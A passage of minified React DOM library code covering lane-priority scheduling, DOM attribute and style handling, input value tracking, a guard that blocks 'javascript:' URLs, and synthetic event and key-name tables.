	var lu = Object.prototype.hasOwnProperty,
		au = c.unstable_scheduleCallback,
		nu = c.unstable_cancelCallback,
		uo = c.unstable_shouldYield,
		io = c.unstable_requestPaint,
		Et = c.unstable_now,
		co = c.unstable_getCurrentPriorityLevel,
		_c = c.unstable_ImmediatePriority,
		Dc = c.unstable_UserBlockingPriority,
		D1 = c.unstable_NormalPriority,
		fo = c.unstable_LowPriority,
		Uc = c.unstable_IdlePriority,
		so = c.log,
		ro = c.unstable_setDisableYieldValue,
		wa = null,
		tt = null;
	function Wt(e) {
		if (
			(typeof so == "function" && ro(e),
			tt && typeof tt.setStrictMode == "function")
		)
			try {
				tt.setStrictMode(wa, e);
			} catch {}
	}
	var lt = Math.clz32 ? Math.clz32 : mo,
		oo = Math.log,
		ho = Math.LN2;
	function mo(e) {
		return (e >>>= 0), e === 0 ? 32 : (31 - ((oo(e) / ho) | 0)) | 0;
	}
	var U1 = 256,
		H1 = 4194304;
	function Sl(e) {
		var t = e & 42;
		if (t !== 0) return t;
		switch (e & -e) {
			case 1:
				return 1;
			case 2:
				return 2;
			case 4:
				return 4;
			case 8:
				return 8;
			case 16:
				return 16;
			case 32:
				return 32;
			case 64:
				return 64;
			case 128:
				return 128;
			case 256:
			case 512:
			case 1024:
			case 2048:
			case 4096:
			case 8192:
			case 16384:
			case 32768:
			case 65536:
			case 131072:
			case 262144:
			case 524288:
			case 1048576:
			case 2097152:
				return e & 4194048;
			case 4194304:
			case 8388608:
			case 16777216:
			case 33554432:
				return e & 62914560;
			case 67108864:
				return 67108864;
			case 134217728:
				return 134217728;
			case 268435456:
				return 268435456;
			case 536870912:
				return 536870912;
			case 1073741824:
				return 0;
			default:
				return e;
		}
	}
	function L1(e, t, l) {
		var a = e.pendingLanes;
		if (a === 0) return 0;
		var n = 0,
			u = e.suspendedLanes,
			i = e.pingedLanes;
		e = e.warmLanes;
		var s = a & 134217727;
		return (
			s !== 0
				? ((a = s & ~u),
				  a !== 0
						? (n = Sl(a))
						: ((i &= s),
						  i !== 0
								? (n = Sl(i))
								: l || ((l = s & ~e), l !== 0 && (n = Sl(l)))))
				: ((s = a & ~u),
				  s !== 0
						? (n = Sl(s))
						: i !== 0
						? (n = Sl(i))
						: l || ((l = a & ~e), l !== 0 && (n = Sl(l)))),
			n === 0
				? 0
				: t !== 0 &&
				  t !== n &&
				  (t & u) === 0 &&
				  ((u = n & -n),
				  (l = t & -t),
				  u >= l || (u === 32 && (l & 4194048) !== 0))
				? t
				: n
		);
	}
	function Ma(e, t) {
		return (
			(e.pendingLanes & ~(e.suspendedLanes & ~e.pingedLanes) & t) === 0
		);
	}
	function po(e, t) {
		switch (e) {
			case 1:
			case 2:
			case 4:
			case 8:
			case 64:
				return t + 250;
			case 16:
			case 32:
			case 128:
			case 256:
			case 512:
			case 1024:
			case 2048:
			case 4096:
			case 8192:
			case 16384:
			case 32768:
			case 65536:
			case 131072:
			case 262144:
			case 524288:
			case 1048576:
			case 2097152:
				return t + 5e3;
			case 4194304:
			case 8388608:
			case 16777216:
			case 33554432:
				return -1;
			case 67108864:
			case 134217728:
			case 268435456:
			case 536870912:
			case 1073741824:
				return -1;
			default:
				return -1;
		}
	}
	function Hc() {
		var e = U1;
		return (U1 <<= 1), (U1 & 4194048) === 0 && (U1 = 256), e;
	}
	function Lc() {
		var e = H1;
		return (H1 <<= 1), (H1 & 62914560) === 0 && (H1 = 4194304), e;
	}
	function uu(e) {
		for (var t = [], l = 0; 31 > l; l++) t.push(e);
		return t;
	}
	function Oa(e, t) {
		(e.pendingLanes |= t),
			t !== 268435456 &&
				((e.suspendedLanes = 0),
				(e.pingedLanes = 0),
				(e.warmLanes = 0));
	}
	function xo(e, t, l, a, n, u) {
		var i = e.pendingLanes;
		(e.pendingLanes = l),
			(e.suspendedLanes = 0),
			(e.pingedLanes = 0),
			(e.warmLanes = 0),
			(e.expiredLanes &= l),
			(e.entangledLanes &= l),
			(e.errorRecoveryDisabledLanes &= l),
			(e.shellSuspendCounter = 0);
		var s = e.entanglements,
			m = e.expirationTimes,
			S = e.hiddenUpdates;
		for (l = i & ~l; 0 < l; ) {
			var T = 31 - lt(l),
				R = 1 << T;
			(s[T] = 0), (m[T] = -1);
			var E = S[T];
			if (E !== null)
				for (S[T] = null, T = 0; T < E.length; T++) {
					var j = E[T];
					j !== null && (j.lane &= -536870913);
				}
			l &= ~R;
		}
		a !== 0 && Bc(e, a, 0),
			u !== 0 &&
				n === 0 &&
				e.tag !== 0 &&
				(e.suspendedLanes |= u & ~(i & ~t));
	}
	function Bc(e, t, l) {
		(e.pendingLanes |= t), (e.suspendedLanes &= ~t);
		var a = 31 - lt(t);
		(e.entangledLanes |= t),
			(e.entanglements[a] =
				e.entanglements[a] | 1073741824 | (l & 4194090));
	}
	function qc(e, t) {
		var l = (e.entangledLanes |= t);
		for (e = e.entanglements; l; ) {
			var a = 31 - lt(l),
				n = 1 << a;
			(n & t) | (e[a] & t) && (e[a] |= t), (l &= ~n);
		}
	}
	function iu(e) {
		switch (e) {
			case 2:
				e = 1;
				break;
			case 8:
				e = 4;
				break;
			case 32:
				e = 16;
				break;
			case 256:
			case 512:
			case 1024:
			case 2048:
			case 4096:
			case 8192:
			case 16384:
			case 32768:
			case 65536:
			case 131072:
			case 262144:
			case 524288:
			case 1048576:
			case 2097152:
			case 4194304:
			case 8388608:
			case 16777216:
			case 33554432:
				e = 128;
				break;
			case 268435456:
				e = 134217728;
				break;
			default:
				e = 0;
		}
		return e;
	}
	function cu(e) {
		return (
			(e &= -e),
			2 < e ? (8 < e ? ((e & 134217727) !== 0 ? 32 : 268435456) : 8) : 2
		);
	}
	function Yc() {
		var e = B.p;
		return e !== 0
			? e
			: ((e = window.event), e === void 0 ? 32 : b2(e.type));
	}
	function go(e, t) {
		var l = B.p;
		try {
			return (B.p = e), t();
		} finally {
			B.p = l;
		}
	}
	var Ft = Math.random().toString(36).slice(2),
		Qe = "__reactFiber$" + Ft,
		Je = "__reactProps$" + Ft,
		Gl = "__reactContainer$" + Ft,
		fu = "__reactEvents$" + Ft,
		vo = "__reactListeners$" + Ft,
		yo = "__reactHandles$" + Ft,
		Gc = "__reactResources$" + Ft,
		Ra = "__reactMarker$" + Ft;
	function su(e) {
		delete e[Qe], delete e[Je], delete e[fu], delete e[vo], delete e[yo];
	}
	function Zl(e) {
		var t = e[Qe];
		if (t) return t;
		for (var l = e.parentNode; l; ) {
			if ((t = l[Gl] || l[Qe])) {
				if (
					((l = t.alternate),
					t.child !== null || (l !== null && l.child !== null))
				)
					for (e = u2(e); e !== null; ) {
						if ((l = e[Qe])) return l;
						e = u2(e);
					}
				return t;
			}
			(e = l), (l = e.parentNode);
		}
		return null;
	}
	function Xl(e) {
		if ((e = e[Qe] || e[Gl])) {
			var t = e.tag;
			if (
				t === 5 ||
				t === 6 ||
				t === 13 ||
				t === 26 ||
				t === 27 ||
				t === 3
			)
				return e;
		}
		return null;
	}
	function za(e) {
		var t = e.tag;
		if (t === 5 || t === 26 || t === 27 || t === 6) return e.stateNode;
		throw Error(r(33));
	}
	function Ql(e) {
		var t = e[Gc];
		return (
			t ||
				(t = e[Gc] =
					{
						hoistableStyles: new Map(),
						hoistableScripts: new Map(),
					}),
			t
		);
	}
	function Ue(e) {
		e[Ra] = !0;
	}
	var Zc = new Set(),
		Xc = {};
	function El(e, t) {
		Vl(e, t), Vl(e + "Capture", t);
	}
	function Vl(e, t) {
		for (Xc[e] = t, e = 0; e < t.length; e++) Zc.add(t[e]);
	}
	var bo = RegExp(
			"^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"
		),
		Qc = {},
		Vc = {};
	function Co(e) {
		return lu.call(Vc, e)
			? !0
			: lu.call(Qc, e)
			? !1
			: bo.test(e)
			? (Vc[e] = !0)
			: ((Qc[e] = !0), !1);
	}
	function B1(e, t, l) {
		if (Co(t))
			if (l === null) e.removeAttribute(t);
			else {
				switch (typeof l) {
					case "undefined":
					case "function":
					case "symbol":
						e.removeAttribute(t);
						return;
					case "boolean":
						var a = t.toLowerCase().slice(0, 5);
						if (a !== "data-" && a !== "aria-") {
							e.removeAttribute(t);
							return;
						}
				}
				e.setAttribute(t, "" + l);
			}
	}
	function q1(e, t, l) {
		if (l === null) e.removeAttribute(t);
		else {
			switch (typeof l) {
				case "undefined":
				case "function":
				case "symbol":
				case "boolean":
					e.removeAttribute(t);
					return;
			}
			e.setAttribute(t, "" + l);
		}
	}
	function Rt(e, t, l, a) {
		if (a === null) e.removeAttribute(l);
		else {
			switch (typeof a) {
				case "undefined":
				case "function":
				case "symbol":
				case "boolean":
					e.removeAttribute(l);
					return;
			}
			e.setAttributeNS(t, l, "" + a);
		}
	}
	var ru, kc;
	function kl(e) {
		if (ru === void 0)
			try {
				throw Error();
			} catch (l) {
				var t = l.stack.trim().match(/\n( *(at )?)/);
				(ru = (t && t[1]) || ""),
					(kc =
						-1 <
						l.stack.indexOf(`
    at`)
							? " (<anonymous>)"
							: -1 < l.stack.indexOf("@")
							? "@unknown:0:0"
							: "");
			}
		return (
			`
` +
			ru +
			e +
			kc
		);
	}
	var ou = !1;
	function du(e, t) {
		if (!e || ou) return "";
		ou = !0;
		var l = Error.prepareStackTrace;
		Error.prepareStackTrace = void 0;
		try {
			var a = {
				DetermineComponentFrameRoot: function () {
					try {
						if (t) {
							var R = function () {
								throw Error();
							};
							if (
								(Object.defineProperty(R.prototype, "props", {
									set: function () {
										throw Error();
									},
								}),
								typeof Reflect == "object" && Reflect.construct)
							) {
								try {
									Reflect.construct(R, []);
								} catch (j) {
									var E = j;
								}
								Reflect.construct(e, [], R);
							} else {
								try {
									R.call();
								} catch (j) {
									E = j;
								}
								e.call(R.prototype);
							}
						} else {
							try {
								throw Error();
							} catch (j) {
								E = j;
							}
							(R = e()) &&
								typeof R.catch == "function" &&
								R.catch(function () {});
						}
					} catch (j) {
						if (j && E && typeof j.stack == "string")
							return [j.stack, E.stack];
					}
					return [null, null];
				},
			};
			a.DetermineComponentFrameRoot.displayName =
				"DetermineComponentFrameRoot";
			var n = Object.getOwnPropertyDescriptor(
				a.DetermineComponentFrameRoot,
				"name"
			);
			n &&
				n.configurable &&
				Object.defineProperty(a.DetermineComponentFrameRoot, "name", {
					value: "DetermineComponentFrameRoot",
				});
			var u = a.DetermineComponentFrameRoot(),
				i = u[0],
				s = u[1];
			if (i && s) {
				var m = i.split(`
`),
					S = s.split(`
`);
				for (
					n = a = 0;
					a < m.length &&
					!m[a].includes("DetermineComponentFrameRoot");

				)
					a++;
				for (
					;
					n < S.length &&
					!S[n].includes("DetermineComponentFrameRoot");

				)
					n++;
				if (a === m.length || n === S.length)
					for (
						a = m.length - 1, n = S.length - 1;
						1 <= a && 0 <= n && m[a] !== S[n];

					)
						n--;
				for (; 1 <= a && 0 <= n; a--, n--)
					if (m[a] !== S[n]) {
						if (a !== 1 || n !== 1)
							do
								if ((a--, n--, 0 > n || m[a] !== S[n])) {
									var T =
										`
` + m[a].replace(" at new ", " at ");
									return (
										e.displayName &&
											T.includes("<anonymous>") &&
											(T = T.replace(
												"<anonymous>",
												e.displayName
											)),
										T
									);
								}
							while (1 <= a && 0 <= n);
						break;
					}
			}
		} finally {
			(ou = !1), (Error.prepareStackTrace = l);
		}
		return (l = e ? e.displayName || e.name : "") ? kl(l) : "";
	}
	function So(e) {
		switch (e.tag) {
			case 26:
			case 27:
			case 5:
				return kl(e.type);
			case 16:
				return kl("Lazy");
			case 13:
				return kl("Suspense");
			case 19:
				return kl("SuspenseList");
			case 0:
			case 15:
				return du(e.type, !1);
			case 11:
				return du(e.type.render, !1);
			case 1:
				return du(e.type, !0);
			case 31:
				return kl("Activity");
			default:
				return "";
		}
	}
	function Kc(e) {
		try {
			var t = "";
			do (t += So(e)), (e = e.return);
			while (e);
			return t;
		} catch (l) {
			return (
				`
Error generating stack: ` +
				l.message +
				`
` +
				l.stack
			);
		}
	}
	function ot(e) {
		switch (typeof e) {
			case "bigint":
			case "boolean":
			case "number":
			case "string":
			case "undefined":
				return e;
			case "object":
				return e;
			default:
				return "";
		}
	}
	function Jc(e) {
		var t = e.type;
		return (
			(e = e.nodeName) &&
			e.toLowerCase() === "input" &&
			(t === "checkbox" || t === "radio")
		);
	}
	function Eo(e) {
		var t = Jc(e) ? "checked" : "value",
			l = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
			a = "" + e[t];
		if (
			!e.hasOwnProperty(t) &&
			typeof l < "u" &&
			typeof l.get == "function" &&
			typeof l.set == "function"
		) {
			var n = l.get,
				u = l.set;
			return (
				Object.defineProperty(e, t, {
					configurable: !0,
					get: function () {
						return n.call(this);
					},
					set: function (i) {
						(a = "" + i), u.call(this, i);
					},
				}),
				Object.defineProperty(e, t, { enumerable: l.enumerable }),
				{
					getValue: function () {
						return a;
					},
					setValue: function (i) {
						a = "" + i;
					},
					stopTracking: function () {
						(e._valueTracker = null), delete e[t];
					},
				}
			);
		}
	}
	function Y1(e) {
		e._valueTracker || (e._valueTracker = Eo(e));
	}
	function $c(e) {
		if (!e) return !1;
		var t = e._valueTracker;
		if (!t) return !0;
		var l = t.getValue(),
			a = "";
		return (
			e && (a = Jc(e) ? (e.checked ? "true" : "false") : e.value),
			(e = a),
			e !== l ? (t.setValue(e), !0) : !1
		);
	}
	function G1(e) {
		if (
			((e = e || (typeof document < "u" ? document : void 0)),
			typeof e > "u")
		)
			return null;
		try {
			return e.activeElement || e.body;
		} catch {
			return e.body;
		}
	}
	var jo = /[\n"\\]/g;
	function dt(e) {
		return e.replace(jo, function (t) {
			return "\\" + t.charCodeAt(0).toString(16) + " ";
		});
	}
	function hu(e, t, l, a, n, u, i, s) {
		(e.name = ""),
			i != null &&
			typeof i != "function" &&
			typeof i != "symbol" &&
			typeof i != "boolean"
				? (e.type = i)
				: e.removeAttribute("type"),
			t != null
				? i === "number"
					? ((t === 0 && e.value === "") || e.value != t) &&
					  (e.value = "" + ot(t))
					: e.value !== "" + ot(t) && (e.value = "" + ot(t))
				: (i !== "submit" && i !== "reset") ||
				  e.removeAttribute("value"),
			t != null
				? mu(e, i, ot(t))
				: l != null
				? mu(e, i, ot(l))
				: a != null && e.removeAttribute("value"),
			n == null && u != null && (e.defaultChecked = !!u),
			n != null &&
				(e.checked =
					n && typeof n != "function" && typeof n != "symbol"),
			s != null &&
			typeof s != "function" &&
			typeof s != "symbol" &&
			typeof s != "boolean"
				? (e.name = "" + ot(s))
				: e.removeAttribute("name");
	}
	function Wc(e, t, l, a, n, u, i, s) {
		if (
			(u != null &&
				typeof u != "function" &&
				typeof u != "symbol" &&
				typeof u != "boolean" &&
				(e.type = u),
			t != null || l != null)
		) {
			if (!((u !== "submit" && u !== "reset") || t != null)) return;
			(l = l != null ? "" + ot(l) : ""),
				(t = t != null ? "" + ot(t) : l),
				s || t === e.value || (e.value = t),
				(e.defaultValue = t);
		}
		(a = a ?? n),
			(a = typeof a != "function" && typeof a != "symbol" && !!a),
			(e.checked = s ? e.checked : !!a),
			(e.defaultChecked = !!a),
			i != null &&
				typeof i != "function" &&
				typeof i != "symbol" &&
				typeof i != "boolean" &&
				(e.name = i);
	}
	function mu(e, t, l) {
		(t === "number" && G1(e.ownerDocument) === e) ||
			e.defaultValue === "" + l ||
			(e.defaultValue = "" + l);
	}
	function Kl(e, t, l, a) {
		if (((e = e.options), t)) {
			t = {};
			for (var n = 0; n < l.length; n++) t["$" + l[n]] = !0;
			for (l = 0; l < e.length; l++)
				(n = t.hasOwnProperty("$" + e[l].value)),
					e[l].selected !== n && (e[l].selected = n),
					n && a && (e[l].defaultSelected = !0);
		} else {
			for (l = "" + ot(l), t = null, n = 0; n < e.length; n++) {
				if (e[n].value === l) {
					(e[n].selected = !0), a && (e[n].defaultSelected = !0);
					return;
				}
				t !== null || e[n].disabled || (t = e[n]);
			}
			t !== null && (t.selected = !0);
		}
	}
	function Fc(e, t, l) {
		if (
			t != null &&
			((t = "" + ot(t)), t !== e.value && (e.value = t), l == null)
		) {
			e.defaultValue !== t && (e.defaultValue = t);
			return;
		}
		e.defaultValue = l != null ? "" + ot(l) : "";
	}
	function Pc(e, t, l, a) {
		if (t == null) {
			if (a != null) {
				if (l != null) throw Error(r(92));
				if (Xe(a)) {
					if (1 < a.length) throw Error(r(93));
					a = a[0];
				}
				l = a;
			}
			l == null && (l = ""), (t = l);
		}
		(l = ot(t)),
			(e.defaultValue = l),
			(a = e.textContent),
			a === l && a !== "" && a !== null && (e.value = a);
	}
	function Jl(e, t) {
		if (t) {
			var l = e.firstChild;
			if (l && l === e.lastChild && l.nodeType === 3) {
				l.nodeValue = t;
				return;
			}
		}
		e.textContent = t;
	}
	var No = new Set(
		"animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(
			" "
		)
	);
	function Ic(e, t, l) {
		var a = t.indexOf("--") === 0;
		l == null || typeof l == "boolean" || l === ""
			? a
				? e.setProperty(t, "")
				: t === "float"
				? (e.cssFloat = "")
				: (e[t] = "")
			: a
			? e.setProperty(t, l)
			: typeof l != "number" || l === 0 || No.has(t)
			? t === "float"
				? (e.cssFloat = l)
				: (e[t] = ("" + l).trim())
			: (e[t] = l + "px");
	}
	function ef(e, t, l) {
		if (t != null && typeof t != "object") throw Error(r(62));
		if (((e = e.style), l != null)) {
			for (var a in l)
				!l.hasOwnProperty(a) ||
					(t != null && t.hasOwnProperty(a)) ||
					(a.indexOf("--") === 0
						? e.setProperty(a, "")
						: a === "float"
						? (e.cssFloat = "")
						: (e[a] = ""));
			for (var n in t)
				(a = t[n]), t.hasOwnProperty(n) && l[n] !== a && Ic(e, n, a);
		} else for (var u in t) t.hasOwnProperty(u) && Ic(e, u, t[u]);
	}
	function pu(e) {
		if (e.indexOf("-") === -1) return !1;
		switch (e) {
			case "annotation-xml":
			case "color-profile":
			case "font-face":
			case "font-face-src":
			case "font-face-uri":
			case "font-face-format":
			case "font-face-name":
			case "missing-glyph":
				return !1;
			default:
				return !0;
		}
	}
	var To = new Map([
			["acceptCharset", "accept-charset"],
			["htmlFor", "for"],
			["httpEquiv", "http-equiv"],
			["crossOrigin", "crossorigin"],
			["accentHeight", "accent-height"],
			["alignmentBaseline", "alignment-baseline"],
			["arabicForm", "arabic-form"],
			["baselineShift", "baseline-shift"],
			["capHeight", "cap-height"],
			["clipPath", "clip-path"],
			["clipRule", "clip-rule"],
			["colorInterpolation", "color-interpolation"],
			["colorInterpolationFilters", "color-interpolation-filters"],
			["colorProfile", "color-profile"],
			["colorRendering", "color-rendering"],
			["dominantBaseline", "dominant-baseline"],
			["enableBackground", "enable-background"],
			["fillOpacity", "fill-opacity"],
			["fillRule", "fill-rule"],
			["floodColor", "flood-color"],
			["floodOpacity", "flood-opacity"],
			["fontFamily", "font-family"],
			["fontSize", "font-size"],
			["fontSizeAdjust", "font-size-adjust"],
			["fontStretch", "font-stretch"],
			["fontStyle", "font-style"],
			["fontVariant", "font-variant"],
			["fontWeight", "font-weight"],
			["glyphName", "glyph-name"],
			["glyphOrientationHorizontal", "glyph-orientation-horizontal"],
			["glyphOrientationVertical", "glyph-orientation-vertical"],
			["horizAdvX", "horiz-adv-x"],
			["horizOriginX", "horiz-origin-x"],
			["imageRendering", "image-rendering"],
			["letterSpacing", "letter-spacing"],
			["lightingColor", "lighting-color"],
			["markerEnd", "marker-end"],
			["markerMid", "marker-mid"],
			["markerStart", "marker-start"],
			["overlinePosition", "overline-position"],
			["overlineThickness", "overline-thickness"],
			["paintOrder", "paint-order"],
			["panose-1", "panose-1"],
			["pointerEvents", "pointer-events"],
			["renderingIntent", "rendering-intent"],
			["shapeRendering", "shape-rendering"],
			["stopColor", "stop-color"],
			["stopOpacity", "stop-opacity"],
			["strikethroughPosition", "strikethrough-position"],
			["strikethroughThickness", "strikethrough-thickness"],
			["strokeDasharray", "stroke-dasharray"],
			["strokeDashoffset", "stroke-dashoffset"],
			["strokeLinecap", "stroke-linecap"],
			["strokeLinejoin", "stroke-linejoin"],
			["strokeMiterlimit", "stroke-miterlimit"],
			["strokeOpacity", "stroke-opacity"],
			["strokeWidth", "stroke-width"],
			["textAnchor", "text-anchor"],
			["textDecoration", "text-decoration"],
			["textRendering", "text-rendering"],
			["transformOrigin", "transform-origin"],
			["underlinePosition", "underline-position"],
			["underlineThickness", "underline-thickness"],
			["unicodeBidi", "unicode-bidi"],
			["unicodeRange", "unicode-range"],
			["unitsPerEm", "units-per-em"],
			["vAlphabetic", "v-alphabetic"],
			["vHanging", "v-hanging"],
			["vIdeographic", "v-ideographic"],
			["vMathematical", "v-mathematical"],
			["vectorEffect", "vector-effect"],
			["vertAdvY", "vert-adv-y"],
			["vertOriginX", "vert-origin-x"],
			["vertOriginY", "vert-origin-y"],
			["wordSpacing", "word-spacing"],
			["writingMode", "writing-mode"],
			["xmlnsXlink", "xmlns:xlink"],
			["xHeight", "x-height"],
		]),
		Ao =
			/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;
	function Z1(e) {
		return Ao.test("" + e)
			? "javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')"
			: e;
	}
	var xu = null;
	function gu(e) {
		return (
			(e = e.target || e.srcElement || window),
			e.correspondingUseElement && (e = e.correspondingUseElement),
			e.nodeType === 3 ? e.parentNode : e
		);
	}
	var $l = null,
		Wl = null;
	function tf(e) {
		var t = Xl(e);
		if (t && (e = t.stateNode)) {
			var l = e[Je] || null;
			e: switch (((e = t.stateNode), t.type)) {
				case "input":
					if (
						(hu(
							e,
							l.value,
							l.defaultValue,
							l.defaultValue,
							l.checked,
							l.defaultChecked,
							l.type,
							l.name
						),
						(t = l.name),
						l.type === "radio" && t != null)
					) {
						for (l = e; l.parentNode; ) l = l.parentNode;
						for (
							l = l.querySelectorAll(
								'input[name="' + dt("" + t) + '"][type="radio"]'
							),
								t = 0;
							t < l.length;
							t++
						) {
							var a = l[t];
							if (a !== e && a.form === e.form) {
								var n = a[Je] || null;
								if (!n) throw Error(r(90));
								hu(
									a,
									n.value,
									n.defaultValue,
									n.defaultValue,
									n.checked,
									n.defaultChecked,
									n.type,
									n.name
								);
							}
						}
						for (t = 0; t < l.length; t++)
							(a = l[t]), a.form === e.form && $c(a);
					}
					break e;
				case "textarea":
					Fc(e, l.value, l.defaultValue);
					break e;
				case "select":
					(t = l.value), t != null && Kl(e, !!l.multiple, t, !1);
			}
		}
	}
	var vu = !1;
	function lf(e, t, l) {
		if (vu) return e(t, l);
		vu = !0;
		try {
			var a = e(t);
			return a;
		} finally {
			if (
				((vu = !1),
				($l !== null || Wl !== null) &&
					(wn(),
					$l && ((t = $l), (e = Wl), (Wl = $l = null), tf(t), e)))
			)
				for (t = 0; t < e.length; t++) tf(e[t]);
		}
	}
	function _a(e, t) {
		var l = e.stateNode;
		if (l === null) return null;
		var a = l[Je] || null;
		if (a === null) return null;
		l = a[t];
		e: switch (t) {
			case "onClick":
			case "onClickCapture":
			case "onDoubleClick":
			case "onDoubleClickCapture":
			case "onMouseDown":
			case "onMouseDownCapture":
			case "onMouseMove":
			case "onMouseMoveCapture":
			case "onMouseUp":
			case "onMouseUpCapture":
			case "onMouseEnter":
				(a = !a.disabled) ||
					((e = e.type),
					(a = !(
						e === "button" ||
						e === "input" ||
						e === "select" ||
						e === "textarea"
					))),
					(e = !a);
				break e;
			default:
				e = !1;
		}
		if (e) return null;
		if (l && typeof l != "function") throw Error(r(231, t, typeof l));
		return l;
	}
	var zt = !(
			typeof window > "u" ||
			typeof window.document > "u" ||
			typeof window.document.createElement > "u"
		),
		yu = !1;
	if (zt)
		try {
			var Da = {};
			Object.defineProperty(Da, "passive", {
				get: function () {
					yu = !0;
				},
			}),
				window.addEventListener("test", Da, Da),
				window.removeEventListener("test", Da, Da);
		} catch {
			yu = !1;
		}
	var Pt = null,
		bu = null,
		X1 = null;
	function af() {
		if (X1) return X1;
		var e,
			t = bu,
			l = t.length,
			a,
			n = "value" in Pt ? Pt.value : Pt.textContent,
			u = n.length;
		for (e = 0; e < l && t[e] === n[e]; e++);
		var i = l - e;
		for (a = 1; a <= i && t[l - a] === n[u - a]; a++);
		return (X1 = n.slice(e, 1 < a ? 1 - a : void 0));
	}
	function Q1(e) {
		var t = e.keyCode;
		return (
			"charCode" in e
				? ((e = e.charCode), e === 0 && t === 13 && (e = 13))
				: (e = t),
			e === 10 && (e = 13),
			32 <= e || e === 13 ? e : 0
		);
	}
	function V1() {
		return !0;
	}
	function nf() {
		return !1;
	}
	function $e(e) {
		function t(l, a, n, u, i) {
			(this._reactName = l),
				(this._targetInst = n),
				(this.type = a),
				(this.nativeEvent = u),
				(this.target = i),
				(this.currentTarget = null);
			for (var s in e)
				e.hasOwnProperty(s) &&
					((l = e[s]), (this[s] = l ? l(u) : u[s]));
			return (
				(this.isDefaultPrevented = (
					u.defaultPrevented != null
						? u.defaultPrevented
						: u.returnValue === !1
				)
					? V1
					: nf),
				(this.isPropagationStopped = nf),
				this
			);
		}
		return (
			w(t.prototype, {
				preventDefault: function () {
					this.defaultPrevented = !0;
					var l = this.nativeEvent;
					l &&
						(l.preventDefault
							? l.preventDefault()
							: typeof l.returnValue != "unknown" &&
							  (l.returnValue = !1),
						(this.isDefaultPrevented = V1));
				},
				stopPropagation: function () {
					var l = this.nativeEvent;
					l &&
						(l.stopPropagation
							? l.stopPropagation()
							: typeof l.cancelBubble != "unknown" &&
							  (l.cancelBubble = !0),
						(this.isPropagationStopped = V1));
				},
				persist: function () {},
				isPersistent: V1,
			}),
			t
		);
	}
	var jl = {
			eventPhase: 0,
			bubbles: 0,
			cancelable: 0,
			timeStamp: function (e) {
				return e.timeStamp || Date.now();
			},
			defaultPrevented: 0,
			isTrusted: 0,
		},
		k1 = $e(jl),
		Ua = w({}, jl, { view: 0, detail: 0 }),
		wo = $e(Ua),
		Cu,
		Su,
		Ha,
		K1 = w({}, Ua, {
			screenX: 0,
			screenY: 0,
			clientX: 0,
			clientY: 0,
			pageX: 0,
			pageY: 0,
			ctrlKey: 0,
			shiftKey: 0,
			altKey: 0,
			metaKey: 0,
			getModifierState: ju,
			button: 0,
			buttons: 0,
			relatedTarget: function (e) {
				return e.relatedTarget === void 0
					? e.fromElement === e.srcElement
						? e.toElement
						: e.fromElement
					: e.relatedTarget;
			},
			movementX: function (e) {
				return "movementX" in e
					? e.movementX
					: (e !== Ha &&
							(Ha && e.type === "mousemove"
								? ((Cu = e.screenX - Ha.screenX),
								  (Su = e.screenY - Ha.screenY))
								: (Su = Cu = 0),
							(Ha = e)),
					  Cu);
			},
			movementY: function (e) {
				return "movementY" in e ? e.movementY : Su;
			},
		}),
		uf = $e(K1),
		Mo = w({}, K1, { dataTransfer: 0 }),
		Oo = $e(Mo),
		Ro = w({}, Ua, { relatedTarget: 0 }),
		Eu = $e(Ro),
		zo = w({}, jl, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
		_o = $e(zo),
		Do = w({}, jl, {
			clipboardData: function (e) {
				return "clipboardData" in e
					? e.clipboardData
					: window.clipboardData;
			},
		}),
		Uo = $e(Do),
		Ho = w({}, jl, { data: 0 }),
		cf = $e(Ho),
		Lo = {
			Esc: "Escape",
			Spacebar: " ",
			Left: "ArrowLeft",
			Up: "ArrowUp",
			Right: "ArrowRight",
			Down: "ArrowDown",
			Del: "Delete",
			Win: "OS",
			Menu: "ContextMenu",
			Apps: "ContextMenu",
			Scroll: "ScrollLock",
			MozPrintableKey: "Unidentified",
		},
		Bo = {
			8: "Backspace",
			9: "Tab",
			12: "Clear",
			13: "Enter",
			16: "Shift",
			17: "Control",
			18: "Alt",
			19: "Pause",
			20: "CapsLock",
			27: "Escape",
			32: " ",
			33: "PageUp",
			34: "PageDown",
			35: "End",
			36: "Home",
			37: "ArrowLeft",
			38: "ArrowUp",
			39: "ArrowRight",
			40: "ArrowDown",
			45: "Insert",
			46: "Delete",
			112: "F1",
			113: "F2",
			114: "F3",
			115: "F4",
			116: "F5",
			117: "F6",
			118: "F7",
			119: "F8",
			120: "F9",
			121: "F10",
			122: "F11",
			123: "F12",
			144: "NumLock",
			145: "ScrollLock",
			224: "Meta",
		},
